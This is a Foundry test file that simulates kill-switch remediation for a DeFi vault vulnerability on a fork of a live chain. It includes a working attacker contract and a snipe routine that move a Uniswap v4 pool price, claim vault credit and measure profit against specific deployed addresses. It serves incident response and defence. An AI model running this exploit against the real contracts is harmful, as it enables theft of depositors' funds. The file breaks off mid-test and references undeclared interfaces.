// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IPoolManager} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/callback/IUnlockCallback.sol";
import {IHooks} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IHooks.sol";
import {PoolKey} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolKey.sol";
import {PoolId, PoolIdLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolId.sol";
import {Currency} from "@crane/contracts/protocols/dexes/uniswap/v4/types/Currency.sol";
import {BalanceDelta, BalanceDeltaLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/types/BalanceDelta.sol";
import {SwapParams} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolOperation.sol";
import {StateLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/StateLibrary.sol";
import {FullMath} from "@crane/contracts/protocols/dexes/uniswap/libraries/FullMath.sol";

/// P11 kill-switch simulation for APEX-2026-010.
/// Fork of live Robinhood mainnet (4663). The ONLY privileged action is a vm.prank as the registry owner
/// read from chain (owner()), exercising the deployed setVaultAddressDisabled / setPackageDisabled.
/// Nothing is broadcast; the prank exists only on the local fork.

interface IReg {
    function owner() external view returns (address);
    function isDisabled(address) external view returns (bool);
    function setVaultAddressDisabled(address, bool) external;
    function setPackageDisabled(address, bool) external;
    function disabledVaults() external view returns (address[] memory);
    function disabledPackages() external view returns (address[] memory);
    function packageOfVault(address) external view returns (address);
    function vaultsOfPackage(address) external view returns (address[] memory);
}

interface ILoupe {
    function facetAddress(bytes4) external view returns (address);
}

interface IOldSE {
    function exchangeOut(address tokenIn, uint256 maxIn, address tokenOut, uint256 amountOut, address to, bool pre, uint256 dl)
        external returns (uint256);
    function deployedReserve() external view returns (uint256, uint256);
    function reserveOfToken(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
}

interface IDetfV {
    function bondNftVault() external view returns (address);
    function rebasingClaimToken() external view returns (address);
}

interface INftV {
    function unlockTimeOf(uint256) external view returns (uint256);
    function ownerOf(uint256) external view returns (address);
}

contract KsAttacker is IUnlockCallback {
    using BalanceDeltaLibrary for BalanceDelta;

    IPoolManager immutable pm;
    PoolKey key;

    constructor(IPoolManager pm_, PoolKey memory key_) {
        pm = pm_;
        key = key_;
    }

    receive() external payable {}

    function swap(bool zeroForOne, uint256 amountIn, uint160 limit) external {
        pm.unlock(abi.encode(zeroForOne, amountIn, limit));
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == address(pm), "pm only");
        (bool z, uint256 amt, uint160 limit) = abi.decode(data, (bool, uint256, uint160));
        BalanceDelta d = pm.swap(key, SwapParams(z, -int256(amt), limit), "");
        _settle(key.currency0, d.amount0());
        _settle(key.currency1, d.amount1());
        return "";
    }

    function _settle(Currency c, int128 delta) internal {
        if (delta < 0) {
            uint256 owe = uint128(-delta);
            if (Currency.unwrap(c) == address(0)) {
                pm.settle{value: owe}();
            } else {
                pm.sync(c);
                IERC20(Currency.unwrap(c)).transfer(address(pm), owe);
                pm.settle();
            }
        } else if (delta > 0) {
            pm.take(c, address(this), uint128(delta));
        }
    }

    function claimCredit(address vault, address tokenIn, uint256 credit, address tokenOut, uint256 amountOut)
        external
        returns (uint256 used)
    {
        used = IOldSE(vault).exchangeOut(tokenIn, credit, tokenOut, amountOut, address(this), true, block.timestamp + 1);
    }
}

contract KillSwitchTest is Test {
    using StateLibrary for IPoolManager;
    using PoolIdLibrary for PoolKey;

    IPoolManager constant PM = IPoolManager(0x8366a39CC670B4001A1121B8F6A443A643e40951);
    IReg constant REG = IReg(0x09682b00D873D913ada0bB69B4D4c9631810d0bc);
    address constant WETH = 0x0Bd7D308f8E1639FAb988df18A8011f41EAcAD73;
    address constant PONS = 0x39dBED3a2bd333467115dE45665cC57F813C4571;
    address constant SE201D = 0x201d31a56c58a3489beC218c7A899d59A07A35f0;
    address constant PKG_V4SE = 0x72b0243E3806eab5E30412cc93682f98f0d20eaE;
    address constant PKG_V4SE_ETH = 0x0172902b0596a7c3F67dBb91542A93A4E15cFD34;
    bytes32 constant POOL_201D = 0x2f312a6f35f48df760b16892c11f963c67cbffd9f3960ea3ccd3a968c54b16cb;
    uint160 constant MIN_SQRT = 4295128739 + 1;
    int24 constant LO = -887200;
    int24 constant HI = 887200;

    address constant RICH_A = 0xCE74BC02Cdf5c8FaECB94a380D98Ec47195a39d1;
    address constant HOOK_A = 0x1ca1771d04366761a2aEf7Ea26F9e18bC8bb6888;
    address constant RICH_B = 0xc2FBe67c474CE7ce273D31B9B3C1c57915642e28;
    address constant HOOK_B = 0x25Ef9b3036Ac1faA5090bbFadC68b2EED0f56888;
    address constant RICH_C = 0x40B613522bC5944330B7141E973280948124f844;
    address constant HOOK_C = 0x46D949601BAE5c7ae0d5792487758862FA6be888;

    uint8 constant M_NONE = 0;
    uint8 constant M_VAULT = 1; // setVaultAddressDisabled(0x201d, true)
    uint8 constant M_PKG = 2; // setPackageDisabled(0x72b0243E, true)
    uint8 constant M_DETF = 3; // alternative: disable the 3 RICH CP-DETFs only (SE left enabled)

    PoolKey key201d;
    address owner_;

    // pre-kill-switch positions
    address holder; // liquid RICH_B (minted)
    address bonder; // RICH_B bond NFT
    uint256 tokenId;
    uint256 lockUsed;

    function setUp() public {
        vm.createSelectFork(vm.envOr("LIVE_FORK_URL", string("https://rpc.mainnet.chain.robinhood.com")));
        key201d = PoolKey({
            currency0: Currency.wrap(address(0)),
            currency1: Currency.wrap(PONS),
            fee: 10000,
            tickSpacing: 200,
            hooks: IHooks(address(0))
        });
        assertEq(PoolId.unwrap(key201d.toId()), POOL_201D, "pool key");
        owner_ = REG.owner();
        console2.log("fork block", block.number);
        console2.log("registry owner (from chain)", owner_);
    }

    // ------------------------------------------------------------------ helpers
    function _dl() internal view returns (uint256) {
        return block.timestamp + 1 hours;
    }

    function _sqrtP() internal view returns (uint160 sp) {
        (sp,,,) = PM.getSlot0(PoolId.wrap(POOL_201D));
    }

    function _ponsToEth(uint256 pons, uint160 sp) internal pure returns (uint256) {
        return FullMath.mulDiv(FullMath.mulDiv(pons, 1 << 96, sp), 1 << 96, sp);
    }

    function _ethToPons(uint256 eth, uint160 sp) internal pure returns (uint256) {
        return FullMath.mulDiv(FullMath.mulDiv(eth, sp, 1 << 96), sp, 1 << 96);
    }

    function _holdValue(address who, uint160 sp) internal view returns (uint256) {
        return who.balance + IERC20(WETH).balanceOf(who) + _ponsToEth(IERC20(PONS).balanceOf(who), sp);
    }

    function _gateWeth() internal view returns (uint256 U) {
        uint256 B0 = IERC20(WETH).balanceOf(SE201D);
        uint256 R = IOldSE(SE201D).reserveOfToken(WETH);
        (uint256 d0,) = IOldSE(SE201D).deployedReserve();
        uint256 fb = R > d0 ? R - d0 : 0;
        U = B0 > fb ? B0 - fb : 0;
    }

    function _seFees() internal view returns (uint256 f0, uint256 f1) {
        (uint128 liq, uint256 l0, uint256 l1) = PM.getPositionInfo(PoolId.wrap(POOL_201D), SE201D, LO, HI, bytes32(0));
        if (liq == 0) return (0, 0);
        (uint256 g0, uint256 g1) = PM.getFeeGrowthInside(PoolId.wrap(POOL_201D), LO, HI);
        unchecked {
            f0 = FullMath.mulDiv(g0 - l0, liq, 1 << 128);
            f1 = FullMath.mulDiv(g1 - l1, liq, 1 << 128);
        }
    }

    function _seNav(uint160 sp) internal view returns (uint256) {
        (uint256 d0, uint256 d1) = IOldSE(SE201D).deployedReserve();
        (uint256 f0, uint256 f1) = _seFees();
        return IERC20(WETH).balanceOf(SE201D) + d0 + f0 + _ponsToEth(IERC20(PONS).balanceOf(SE201D) + d1 + f1, sp);
    }

    function _richHooksValue(uint160 sp) internal view returns (uint256) {
        uint256 sh = IOldSE(SE201D).balanceOf(HOOK_A) + IOldSE(SE201D).balanceOf(HOOK_B) + IOldSE(SE201D).balanceOf(HOOK_C);
        return FullMath.mulDiv(_seNav(sp), sh, IOldSE(SE201D).totalSupply());
    }

    /// Low-level probe: pranked call, logs OK / REVERT + selector. Never asserts.
    function _probe(string memory label, address who, address target, bytes memory data)
        internal
        returns (bool ok, bytes memory ret)
    {
        vm.prank(who);
        (ok, ret) = target.call(data);
        if (ok) {
            console2.log(string.concat("  PROBE ", label, ": OK"));
        } else {
            console2.log(string.concat("  PROBE ", label, ": REVERT"));
            if (ret.length >= 4) console2.logBytes4(bytes4(ret));
        }
    }

    function _approve(address who, address token, address spender) internal {
        vm.prank(who);
        IERC20(token).approve(spender, type(uint256).max);
    }

    function _apply(uint8 mode) internal {
        if (mode == M_NONE) return;
        vm.startPrank(owner_);
        if (mode == M_VAULT) {
            REG.setVaultAddressDisabled(SE201D, true);
        } else if (mode == M_PKG) {
            REG.setPackageDisabled(PKG_V4SE, true);
        } else if (mode == M_DETF) {
            REG.setVaultAddressDisabled(RICH_A, true);
            REG.setVaultAddressDisabled(RICH_B, true);
            REG.setVaultAddressDisabled(RICH_C, true);
        }
        vm.stopPrank();
        console2.log("mode applied", uint256(mode));
        console2.log("  isDisabled(SE201D)", REG.isDisabled(SE201D));
        console2.log("  isDisabled(RICH_B)", REG.isDisabled(RICH_B));
        console2.log("  isDisabled(HOOK_B)", REG.isDisabled(HOOK_B));
    }

    function _bond(address who, uint256 amt) internal returns (bool ok, uint256 id, uint256 lock) {
        deal(WETH, who, amt);
        _approve(who, WETH, RICH_B);
        uint256[5] memory locks = [uint256(7 days), 30 days, 90 days, 180 days, 365 days];
        for (uint256 i; i < locks.length && !ok; i++) {
            vm.prank(who);
            try IBond(RICH_B).bond(WETH, amt, locks[i], who, false, _dl()) returns (uint256 id_, uint256) {
                ok = true;
                id = id_;
                lock = locks[i];
            } catch (bytes memory err) {
                if (i == locks.length - 1 || err.length < 4) {
                    console2.log("  bond revert (last lock tried)", locks[i]);
                }
                if (err.length >= 4) console2.logBytes4(bytes4(err));
            }
        }
    }

    function _prepPositions() internal {
        holder = makeAddr("richHolder");
        deal(WETH, holder, 0.2 ether);
        _approve(holder, WETH, RICH_B);
        vm.prank(holder);IBond(RICH_B).exchangeIn(WETH, 0.2 ether, RICH_B, 0, holder, false, _dl());
        bonder = makeAddr("richBonder");
        bool ok;
        (ok, tokenId, lockUsed) = _bond(bonder, 0.2 ether);
        require(ok, "prep bond failed");
        console2.log("prep: holder RICH_B", IERC20(RICH_B).balanceOf(holder));
        console2.log("prep: bonder tokenId / lock", tokenId, lockUsed);
    }

    // -------------------------------------------------------------- 0: state + loupe (Q4)
    function test_00_stateAndRepointLoupe() public view {
        console2.log("isDisabled 0x201d / RICH_B / HOOK_B", REG.isDisabled(SE201D), REG.isDisabled(RICH_B), REG.isDisabled(HOOK_B));
        address[] memory dv = REG.disabledVaults();
        for (uint256 i; i < dv.length; i++) console2.log("disabledVault", dv[i]);
        console2.log("disabledPackages len", REG.disabledPackages().length);
        address[] memory v1 = REG.vaultsOfPackage(PKG_V4SE);
        for (uint256 i; i < v1.length; i++) console2.log("pkg 0x72b0243E vault", v1[i]);
        address[] memory v2 = REG.vaultsOfPackage(PKG_V4SE_ETH);
        for (uint256 i; i < v2.length; i++) console2.log("pkg 0x0172902b vault", v2[i]);
        console2.log("pkg of RICH_B / HOOK_B", REG.packageOfVault(RICH_B), REG.packageOfVault(HOOK_B));

        // Q4: is there any owner setter to re-point standardExchange / reserveHook, or a diamondCut?
        bytes4[7] memory sels = [
            bytes4(keccak256("setStandardExchange(address)")),
            bytes4(keccak256("setStandardExchangeVault(address)")),
            bytes4(keccak256("setReserveHook(address)")),
            bytes4(keccak256("setPairToken(address)")),
            bytes4(0x1f931c1c), // diamondCut((address,uint8,bytes4[])[],address,bytes)
            bytes4(keccak256("upgradeTo(address)")),
            bytes4(keccak256("setOwnerOnlyLiquidity(bool)"))
        ];
        address[4] memory targets = [HOOK_B, RICH_B, SE201D, address(REG)];
        for (uint256 t; t < targets.length; t++) {
            for (uint256 s; s < sels.length; s++) {
                address f = ILoupe(targets[t]).facetAddress(sels[s]);
                if (f != address(0)) {
                    console2.log("  setter/cut PRESENT on", targets[t], f);
                    console2.logBytes4(sels[s]);
                }
            }
        }
        console2.log("hook standardExchange()", IHookV(HOOK_B).standardExchange());
        console2.log("hook owner()", IOwn(HOOK_B).owner());
        uint160 sp = _sqrtP();
        console2.log("SE201D NAV wei", _seNav(sp));
        console2.log("RICH hooks value in SE201D wei", _richHooksValue(sp));
        console2.log("SE201D supply / hooks shares", IOldSE(SE201D).totalSupply(),
            IOldSE(SE201D).balanceOf(HOOK_A) + IOldSE(SE201D).balanceOf(HOOK_B) + IOldSE(SE201D).balanceOf(HOOK_C));
        console2.log("SE201D free WETH / PONS", IERC20(WETH).balanceOf(SE201D), IERC20(PONS).balanceOf(SE201D));
    }

    // -------------------------------------------------------------- matrix (Q1/Q2/Q3/alt)
    function test_10_matrix_none() public {
        _matrix(M_NONE);
    }

    function test_11_matrix_vaultDisable() public {
        _matrix(M_VAULT);
    }

    function test_12_matrix_pkgDisable() public {
        _matrix(M_PKG);
    }

    function test_13_matrix_detfOnlyDisable() public {
        _matrix(M_DETF);
    }

    function _matrix(uint8 mode) internal {
        _prepPositions();
        _apply(mode);
        uint256 snap = vm.snapshotState();

        _probeEntry();
        vm.revertToState(snap);
        _probeViews();
        vm.revertToState(snap);
        _probeLiquidExits();
        vm.revertToState(snap);
        _probeBondExits();
        vm.revertToState(snap);
        _probeClaimPath();
        vm.revertToState(snap);
        _probeHookOwner();
        vm.revertToState(snap);
        _probeOtherFamilies();
    }

    function _probeEntry() internal {
        console2.log("[entry]");
        address u = makeAddr("newBonder");
        (bool ok,,) = _bond(u, 0.1 ether);
        console2.log(ok ? "  PROBE new bond: OK" : "  PROBE new bond: REVERT (all locks)");
        address m = makeAddr("newMinter");
        deal(WETH, m, 0.1 ether);
        _approve(m, WETH, RICH_B);
        _probe("new mint (DETF.exchangeIn WETH->RICH)", m, RICH_B,
            abi.encodeCall(IBond.exchangeIn, (WETH, 0.1 ether, RICH_B, 0, m, false, _dl())));
        address b = makeAddr("hookBuyer");
        deal(WETH, b, 0.1 ether);
        _approve(b, WETH, HOOK_B);
        _probe("hook buy (HOOK_B.exchangeIn WETH->RICH)", b, HOOK_B,
            abi.encodeCall(IBond.exchangeIn, (WETH, 0.1 ether, RICH_B, 0, b, false, _dl())));
        console2.log("  SE201D free WETH after entry probes", IERC20(WETH).balanceOf(SE201D));
    }

    function _probeViews() internal {
        console2.log("[views]");
        _probe("HOOK_B.seClaimSupply()", address(this), HOOK_B, abi.encodeWithSignature("seClaimSupply()"));
        _probe("RICH_B.previewExchangeIn(RICH->WETH)", address(this), RICH_B,
            abi.encodeWithSignature("previewExchangeIn(address,uint256,address)", RICH_B, 1e18, WETH));
        _probe("SE.previewExchangeIn(SE->WETH)", address(this), SE201D,
            abi.encodeWithSignature("previewExchangeIn(address,uint256,address)", SE201D, 1e15, WETH));
        _probe("RICH_B.previewCloseBondMature", address(this), RICH_B,
            abi.encodeWithSignature("previewCloseBondMature(uint256)", tokenId));
    }

    function _probeLiquidExits() internal {
        console2.log("[liquid RICH holder exits]");
        uint256 bal = IERC20(RICH_B).balanceOf(holder);
        _approve(holder, RICH_B, RICH_B);
        _approve(holder, RICH_B, HOOK_B);
        uint256 w0 = IERC20(WETH).balanceOf(holder);
        (bool ok,) = _probe("DETF burn (RICH_B.exchangeIn RICH->WETH)", holder, RICH_B,
            abi.encodeCall(IBond.exchangeIn, (RICH_B, bal / 2, WETH, 0, holder, false, _dl())));
        if (ok) console2.log("    WETH out", IERC20(WETH).balanceOf(holder) - w0);
        w0 = IERC20(WETH).balanceOf(holder);
        (ok,) = _probe("hook sell (HOOK_B.exchangeIn RICH->WETH)", holder, HOOK_B,
            abi.encodeCall(IBond.exchangeIn, (RICH_B, bal / 4, WETH, 0, holder, false, _dl())));
        if (ok) console2.log("    WETH out", IERC20(WETH).balanceOf(holder) - w0);
        _probe("RICH transfer (ERC20)", holder, RICH_B, abi.encodeCall(IERC20.transfer, (address(0xBEEF), 1)));
    }

    function _probeBondExits() internal {
        console2.log("[bond NFT exits]");
        address nft = IDetfV(RICH_B).bondNftVault();
        _probe("claimRewards (pre-maturity)", bonder, RICH_B,
            abi.encodeWithSignature("claimRewards(uint256,address)", tokenId, bonder));
        _probe("NFT.claimRewards direct (pre-maturity)", bonder, nft,
            abi.encodeWithSignature("claimRewards(uint256,address)", tokenId, bonder));
        vm.warp(INftV(nft).unlockTimeOf(tokenId) + 1);
        console2.log("  warped to maturity", block.timestamp);
        uint256 snap = vm.snapshotState();
        uint256[] memory mins = new uint256[](2);
        uint256 w0 = IERC20(WETH).balanceOf(bonder);
        (bool ok,) = _probe("closeBondMature", bonder, RICH_B,
            abi.encodeWithSignature("closeBondMature(uint256,uint256[],address,uint256)", tokenId, mins, bonder, _dl()));
        if (ok) console2.log("    WETH out", IERC20(WETH).balanceOf(bonder) - w0);
        vm.revertToState(snap);
        _probe("claimRewards (mature)", bonder, RICH_B,
            abi.encodeWithSignature("claimRewards(uint256,address)", tokenId, bonder));
        vm.revertToState(snap);
        _probe("NFT.redeemPosition direct (expected onlyOwner)", bonder, nft,
            abi.encodeWithSignature("redeemPosition(uint256,address,uint256)", tokenId, bonder, _dl()));
    }

    function _probeClaimPath() internal {
        console2.log("[sellPosition -> redeemClaim]");
        address nft = IDetfV(RICH_B).bondNftVault();
        vm.warp(INftV(nft).unlockTimeOf(tokenId) + 1);
        (bool ok,) = _probe("sellPositionToDetfNft", bonder, RICH_B,
            abi.encodeWithSignature("sellPositionToDetfNft(uint256,address)", tokenId, bonder));
        address claim = IDetfV(RICH_B).rebasingClaimToken();
        console2.log("  rebasingClaimToken", claim);
        if (!ok || claim == address(0)) return;
        uint256 cb = IERC20(claim).balanceOf(bonder);
        console2.log("  claim balance", cb);
        if (cb == 0) return;
        uint256 r0 = IERC20(RICH_B).balanceOf(bonder);
        (ok,) = _probe("redeemClaim (claim->RICH)", bonder, RICH_B,
            abi.encodeWithSignature("redeemClaim(uint256,address,uint256,address,uint256)", cb, RICH_B, 0, bonder, _dl()));
        if (ok) console2.log("    RICH out", IERC20(RICH_B).balanceOf(bonder) - r0);
    }

    function _probeHookOwner() internal {
        console2.log("[hook LP owner (= the DETF) withdraw]");
        address nft = IDetfV(RICH_B).bondNftVault();
        uint256 lp = IERC20(HOOK_B).balanceOf(RICH_B);
        console2.log("  hook LP held by DETF / NFT vault", lp, IERC20(HOOK_B).balanceOf(nft));
        if (lp == 0) {
            // mechanism probe only: move a little LP from the NFT vault onto the owner (DETF)
            lp = IERC20(HOOK_B).balanceOf(nft) / 1000;
            vm.prank(nft);
            IERC20(HOOK_B).transfer(RICH_B, lp);
        } else {
            lp = lp / 2;
        }
        uint256 snap = vm.snapshotState();
        _probe("HOOK_B.withdraw (proportional, as owner)", RICH_B, HOOK_B,
            abi.encodeWithSignature("withdraw(uint256,address,uint256,uint256,uint256)", lp, RICH_B, 0, 0, _dl()));
        vm.revertToState(snap);
        _probe("HOOK_B.withdrawSingle(->WETH, as owner)", RICH_B, HOOK_B,
            abi.encodeWithSignature("withdrawSingle(uint256,address,address,uint256,uint256)", lp, WETH, RICH_B, 0, _dl()));
        vm.revertToState(snap);
        uint256 s0 = IOldSE(SE201D).balanceOf(RICH_B);
        (bool ok,) = _probe("HOOK_B.withdrawSeShares (in-kind SE shares, as owner)", RICH_B, HOOK_B,
            abi.encodeWithSignature("withdrawSeShares(uint256,address,uint256,uint256,uint256)", lp, RICH_B, 0, 0, _dl()));
        if (ok) {
            uint256 got = IOldSE(SE201D).balanceOf(RICH_B) - s0;
            console2.log("    SE shares received", got);
            _approve(RICH_B, SE201D, SE201D);
            _probe("  then SE.exchangeIn(SE->WETH) by share holder (approved)", RICH_B, SE201D,
                abi.encodeCall(IBond.exchangeIn, (SE201D, got, WETH, 0, RICH_B, false, _dl())));
        }
        _probe("HOOK_B.withdraw by non-owner (control)", address(0xBAD), HOOK_B,
            abi.encodeWithSignature("withdraw(uint256,address,uint256,uint256,uint256)", 1, address(0xBAD), 0, 0, _dl()));
    }

    function _probeOtherFamilies() internal {
        console2.log("[other families on pkg 0x72b0243E]");
        console2.log("  isDisabled 0xb7D4 / 0x3E33 / 0xabC9 / 0x17B5",
            REG.isDisabled(0xb7D4Bb379D361AD442CddEE53eA71a33957826A7),
            REG.isDisabled(0x3E33871A8740b294A48347BFFD8A5004E1578c0D),
            REG.isDisabled(0xabC9C5B5c8118a15A440Ac59a1C74A718E65681C));
        console2.log("  isDisabled 0x17B5 / 0x64e0 / 0x999D",
            REG.isDisabled(0x17B5f1045Edf3b6215d0C38eB9FF50649d887D10),
            REG.isDisabled(0x64e0f5A5Cf0F579EFF0981A4fEDEA77964B74531),
            REG.isDisabled(0x999DaE02D22E5FEe1c4508430D5196d31d631009));
        // DTF hook 0x9238 behind 0xb7D4: a small hook buy WETH->DTF-DETF tells whether that family freezes too
        address dtfHook = 0x923877336b14662cFb5B3A60b14e7d716d54A888;
        address b = makeAddr("dtfBuyer");
        deal(WETH, b, 0.01 ether);
        _approve(b, WETH, dtfHook);
        address raw = IHookV(dtfHook).rawToken();
        _probe("DTF hook 0x9238 buy WETH->raw", b, dtfHook,
            abi.encodeCall(IBond.exchangeIn, (WETH, 0.01 ether, raw, 0, b, false, _dl())));
    }

    /// Trace helpers (baseline, no kill switch): why do burn / hook-withdraw exits revert?
    function test_30_trace_burn_baseline() public {
        _prepPositions();
        uint256 bal = IERC20(RICH_B).balanceOf(holder);
        _approve(holder, RICH_B, RICH_B);
        vm.prank(holder);
        // PRE-EXISTING (no kill switch): hook.withdrawSingle -> SE.exchangeIn(SEshares, pretransferred=false)
        // -> SE.transferFrom(hook) with zero allowance -> TransferFromFailed().
        vm.expectRevert(bytes4(0x7939f424));IBond(RICH_B).exchangeIn(RICH_B, bal / 2, WETH, 0, holder, false, _dl());
    }

    function test_31_trace_burn_pretransferred_baseline() public {
        _prepPositions();
        uint256 bal = IERC20(RICH_B).balanceOf(holder);
        vm.startPrank(holder);
        IERC20(RICH_B).transfer(RICH_B, bal / 2);
        vm.expectRevert(bytes4(0x7939f424));IBond(RICH_B).exchangeIn(RICH_B, bal / 2, WETH, 0, holder, true, _dl());
        vm.stopPrank();
    }

    /// Real on-chain bond NFT id 3 on RICH_B (mature, owner from chain): exits with / without the kill switch.
    function test_32_realBond3_none() public {
        _realBond(M_NONE);
    }

    function test_33_realBond3_vault() public {
        _realBond(M_VAULT);
    }

    function _realBond(uint8 mode) internal {
        address nft = IDetfV(RICH_B).bondNftVault();
        address o = INftV(nft).ownerOf(3);
        console2.log("real id3 owner / unlock / now", o, INftV(nft).unlockTimeOf(3), block.timestamp);
        _apply(mode);
        uint256 snap = vm.snapshotState();
        uint256[] memory mins = new uint256[](2);
        _probe("real id3 closeBondMature", o, RICH_B,
            abi.encodeWithSignature("closeBondMature(uint256,uint256[],address,uint256)", 3, mins, o, _dl()));
        vm.revertToState(snap);
        _probe("real id3 claimRewards", o, RICH_B, abi.encodeWithSignature("claimRewards(uint256,address)", 3, o));
        vm.revertToState(snap);
        _probe("real id3 sellPositionToDetfNft", o, RICH_B,
            abi.encodeWithSignature("sellPositionToDetfNft(uint256,address)", 3, o));
    }

    /// Siblings RICH_A / RICH_C: mint, burn, hook sell with / without the kill switch.
    function test_34_siblings_none() public {
        _siblings(M_NONE);
    }

    function test_35_siblings_vault() public {
        _siblings(M_VAULT);
    }

    function _siblings(uint8 mode) internal {
        address[2] memory d = [RICH_A, RICH_C];
        address[2] memory h = [HOOK_A, HOOK_C];
        address u = makeAddr("sibHolder");
        for (uint256 i; i < 2; i++) {
            deal(WETH, u, 0.05 ether);
            _approve(u, WETH, d[i]);
            vm.prank(u);IBond(d[i]).exchangeIn(WETH, 0.05 ether, d[i], 0, u, false, _dl());
        }
        _apply(mode);
        for (uint256 i; i < 2; i++) {
            console2.log("sibling DETF / hook", d[i], h[i]);
            uint256 bal = IERC20(d[i]).balanceOf(u);
            _approve(u, d[i], d[i]);
            _approve(u, d[i], h[i]);
            uint256 snap = vm.snapshotState();
            _probe("sib DETF burn ->WETH", u, d[i], abi.encodeCall(IBond.exchangeIn, (d[i], bal / 2, WETH, 0, u, false, _dl())));
            vm.revertToState(snap);
            _probe("sib hook sell ->WETH", u, h[i], abi.encodeCall(IBond.exchangeIn, (d[i], bal / 2, WETH, 0, u, false, _dl())));
            vm.revertToState(snap);
            deal(WETH, u, 0.05 ether);
            _probe("sib new mint", u, d[i], abi.encodeCall(IBond.exchangeIn, (WETH, 0.05 ether, d[i], 0, u, false, _dl())));
            vm.revertToState(snap);
        }
    }

    // -------------------------------------------------------------- snipe (Q1 test_C re-run)
    /// Returns attacker profit at the restored price; claim attempt is try/caught.
    function _attackTry(uint256 push) internal returns (int256 profit, bool claimed) {
        uint160 sp0 = _sqrtP();
        KsAttacker atk = new KsAttacker(PM, key201d);
        vm.deal(address(atk), 2 ether);
        deal(PONS, address(atk), _ethToPons(0.05 ether, sp0));
        uint256 before_ = _holdValue(address(atk), sp0);
        atk.swap(true, push, MIN_SQRT);
        uint256 U = _gateWeth();
        console2.log("  U(WETH) after push", U);
        if (U > 0) {
            uint256 w0 = IERC20(WETH).balanceOf(address(atk));
            try atk.claimCredit(SE201D, WETH, U, PONS, 1e9) returns (uint256 used) {
                claimed = true;
                console2.log("  CLAIM OK; used", used);
                console2.log("  WETH refunded to attacker (never sent)", IERC20(WETH).balanceOf(address(atk)) - w0);
            } catch (bytes memory err) {
                console2.log("  CLAIM REVERTED");
                if (err.length >= 4) console2.logBytes4(bytes4(err));
            }
        }
        atk.swap(false, IERC20(PONS).balanceOf(address(atk)), sp0);
        assertEq(_sqrtP(), sp0, "price restored exactly");
        profit = int256(_holdValue(address(atk), sp0)) - int256(before_);
        console2.log("  attacker net profit (wei ETH)", profit);
    }

    /// Baseline (no kill switch): honest bond then snipe == APEX-010 test_C.
    function test_20_snipe_baseline() public {
        (bool ok,,) = _bond(makeAddr("victim"), 0.5 ether);
        assertTrue(ok, "bond");
        uint160 sp = _sqrtP();
        uint256 v0 = _richHooksValue(sp);
        (int256 p, bool c) = _attackTry(1 ether);
        console2.log("  RICH backing delta", int256(_richHooksValue(sp)) - int256(v0));
        assertTrue(c, "claim succeeds pre-kill");
        assertGt(p, 0, "profit pre-kill");
    }

    /// After vault disable: new honest bond reverts; snipe cannot claim.
    function test_21_snipe_afterVaultDisable() public {
        _apply(M_VAULT);
        (bool ok,,) = _bond(makeAddr("victim"), 0.5 ether);
        console2.log("  honest bond after disable ok?", ok);
        assertFalse(ok, "bond blocked");
        (int256 p, bool c) = _attackTry(1 ether);
        assertFalse(c, "claim blocked");
        assertLe(p, 0, "no profit");
    }

    /// Worst case: honest bond lands BEFORE the disable tx (sleeve funded), then disable, then attack.
    function test_22_snipe_bondBeforeDisable_vault() public {
        _bondThenDisableThenAttack(M_VAULT);
    }

    function test_23_snipe_bondBeforeDisable_pkg() public {
        _bondThenDisableThenAttack(M_PKG);
    }

    function _bondThenDisableThenAttack(uint8 mode) internal {
        (bool ok,,) = _bond(makeAddr("victim"), 0.5 ether);
        assertTrue(ok, "bond");
        uint256 free0 = IERC20(WETH).balanceOf(SE201D);
        console2.log("  SE free WETH after pre-disable bond", free0);
        _apply(mode);
        (int256 p, bool c) = _attackTry(1 ether);
        assertFalse(c, "claim blocked");
        assertLe(p, 0, "no profit");
        console2.log("  SE free WETH still in vault (frozen, not stolen)", IERC20(WETH).balanceOf(SE201D));
        assertEq(IERC20(WETH).balanceOf(SE201D), free0, "sleeve untouched");
    }

    /// Ordering hazard: re-enabling later re-arms the snipe on whatever sleeve accumulated pre-disable.
    function test_24_reEnable_rearmsSnipe() public {
        (bool ok,,) = _bond(makeAddr("victim"), 0.5 ether);
        assertTrue(ok, "bond");
        _apply(M_VAULT);
        vm.prank(owner_);
        REG.setVaultAddressDisabled(SE201D, false);
        console2.log("  re-enabled; isDisabled", REG.isDisabled(SE201D));
        (int256 p, bool c) = _attackTry(1 ether);
        console2.log("  re-armed claim?", c);
        console2.log("  profit after re-enable", p);
    }

    /// Hook-pool trading also feeds the sleeve: honest WETH->RICH buy through HOOK_B, then snipe (no kill switch).
    function test_25_snipe_afterHookBuy_baseline() public {
        address b = makeAddr("hookBuyer");
        deal(WETH, b, 0.5 ether);
        _approve(b, WETH, HOOK_B);
        vm.prank(b);IBond(HOOK_B).exchangeIn(WETH, 0.5 ether, RICH_B, 0, b, false, _dl());
        console2.log("  SE free WETH after honest hook buy", IERC20(WETH).balanceOf(SE201D));
        console2.log("  U(WETH) after hook buy", _gateWeth());
        (int256 p, bool c) = _attackTry(1 ether);
        console2.log("  claim after hook buy?", c);
        console2.log("  profit", p);
    }

    /// Alternative remediation (DETF-only disable): bond/mint blocked but hook buys still feed the sleeve.
    function test_26_snipe_afterHookBuy_detfOnlyDisable() public {
        _apply(M_DETF);
        address b = makeAddr("hookBuyer");
        deal(WETH, b, 0.5 ether);
        _approve(b, WETH, HOOK_B);
        vm.prank(b);
        (bool ok,) = HOOK_B.call(abi.encodeCall(IBond.exchangeIn, (WETH, 0.5 ether, RICH_B, 0, b, false, _dl())));
        console2.log("  hook buy under DETF-only disable ok?", ok);
        (int256 p, bool c) = _attackTry(1 ether);
        console2.log("  claim?", c);
        console2.log("  profit", p);
    }

    /// Existing open PONS credit on 0x201d (APEX-010 T0) closed by the vault disable?
    function test_27_openPonsCredit_afterVaultDisable() public {
